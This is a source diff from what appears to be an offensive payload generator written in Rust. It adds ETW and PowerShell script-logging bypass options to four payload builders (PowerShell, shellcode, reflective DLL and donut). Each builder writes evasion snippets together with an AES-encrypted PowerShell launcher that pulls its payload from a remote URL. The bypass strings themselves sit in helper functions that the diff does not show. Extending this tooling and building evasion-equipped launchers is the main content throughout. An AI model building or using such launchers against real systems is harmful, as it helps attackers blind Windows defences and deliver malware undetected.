@@ -48,11 +48,15 @@ pub fn powershell_payload(matches: &ArgMatches) {
         process::exit(1);
     };
     let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
+    let disable_etw = if matches.is_present("disable_etw") { true } else { false };
+    let disable_scriptlog = if matches.is_present("disable_scriptlog") { true } else { false };
     let hta = if matches.is_present("generate_hta") { true } else { false };
     println!("Target URL: {}", url);
     println!("Payload: {}", payload_path);
     println!("Payload size: {}", payload.chars().count());
-    println!("AMSI enabled: {}", !disable_amsi);
+    println!("AMSI bypass: {}", !disable_amsi);
+    println!("ETW bypass: {}", !disable_etw);
+    println!("Script logging bypass: {}", !disable_scriptlog);
     println!("Generate HTA: {}", hta);
 
     // encrypt
@@ -67,11 +71,20 @@ pub fn powershell_payload(matches: &ArgMatches) {
     // prepare output file
     let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");
 
-    // AMSI bypass
+    // Bypass
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
     }
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
     output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
     println!("PowerShell launcher saved to launch.txt");
@@ -107,6 +120,8 @@ pub fn shellcode_payload(matches: &ArgMatches) {
         process::exit(1);
     };
     let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
+    let disable_etw = if matches.is_present("disable_etw") { true } else { false };
+    let disable_scriptlog = if matches.is_present("disable_scriptlog") { true } else { false };
     let hta = if matches.is_present("generate_hta") { true } else { false };
     println!("Target URL: {}", url);
     if dll_to_shellcode {
@@ -115,7 +130,9 @@ pub fn shellcode_payload(matches: &ArgMatches) {
         println!("Shellcode: {}", target_path);
     }
     println!("Shellcode size: {}", shellcode.len());
-    println!("AMSI enabled: {}", !disable_amsi);
+    println!("AMSI bypass: {}", !disable_amsi);
+    println!("ETW bypass: {}", !disable_etw);
+    println!("Script logging bypass: {}", !disable_scriptlog);
     println!("Generate HTA: {}", hta);
 
     // prepare invoker and shellcode
@@ -139,11 +156,20 @@ pub fn shellcode_payload(matches: &ArgMatches) {
     // prepare output file
     let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");
 
-    // AMSI bypass
+    // Bypass
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
     }
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
     output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
     println!("PowerShell launcher saved to launch.txt");
@@ -168,11 +194,15 @@ pub fn reflective_payload(matches: &ArgMatches) {
         process::exit(1);
     };
     let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
+    let disable_etw = if matches.is_present("disable_etw") { true } else { false };
+    let disable_scriptlog = if matches.is_present("disable_scriptlog") { true } else { false };
     let hta = if matches.is_present("generate_hta") { true } else { false };
     println!("Target URL: {}", url);
     println!("PE/DLL: {}", dll_path);
     println!("PE/DLL size: {}", dll.len());
-    println!("AMSI enabled: {}", !disable_amsi);
+    println!("AMSI bypass: {}", !disable_amsi);
+    println!("ETW bypass: {}", !disable_etw);
+    println!("Script logging bypass: {}", !disable_scriptlog);
     println!("Generate HTA: {}", hta);
 
     // prepare invoker and shellcode
@@ -190,11 +220,20 @@ pub fn reflective_payload(matches: &ArgMatches) {
     // prepare output file
     let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");
 
-    // AMSI bypass
+    // Bypass
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
     }
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
     output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
     println!("PowerShell launcher saved to launch.txt");
@@ -219,6 +258,8 @@ pub fn donut_payload(matches: &ArgMatches) {
         process::exit(1);
     };
     let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
+    let disable_etw = if matches.is_present("disable_etw") { true } else { false };
+    let disable_scriptlog = if matches.is_present("disable_scriptlog") { true } else { false };
     let hta = if matches.is_present("generate_hta") { true } else { false };
     let target_process = if matches.is_present("target-process") {
         matches.value_of("target-process").unwrap()
@@ -228,7 +269,9 @@ pub fn donut_payload(matches: &ArgMatches) {
     println!("Target URL: {}", url);
     println!("Shellcode: {}", donut_path);
     println!("Shellcode size: {}", shellcode.len());
-    println!("AMSI enabled: {}", !disable_amsi);
+    println!("AMSI bypass: {}", !disable_amsi);
+    println!("ETW bypass: {}", !disable_etw);
+    println!("Script logging bypass: {}", !disable_scriptlog);
     println!("Generate HTA: {}", hta);
     println!("Target process: {}", target_process);
 
@@ -247,11 +290,20 @@ pub fn donut_payload(matches: &ArgMatches) {
     // prepare output file
     let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");
 
-    // AMSI bypass
+    // Bypass
     if !disable_amsi {
         let amsi_bypass = util::payload::get_amsi();
         output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
     }
+    if !disable_etw {
+        let etw_bypass = util::payload::get_etw();
+        output_file.write_all(etw_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+    if !disable_scriptlog {
+        let scriptlog_bypass = util::payload::get_scriptlog();
+        output_file.write_all(scriptlog_bypass.as_bytes()).expect("Could not write contents to output file");
+    }
+
     let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
     output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
     println!("PowerShell launcher saved to launch.txt");
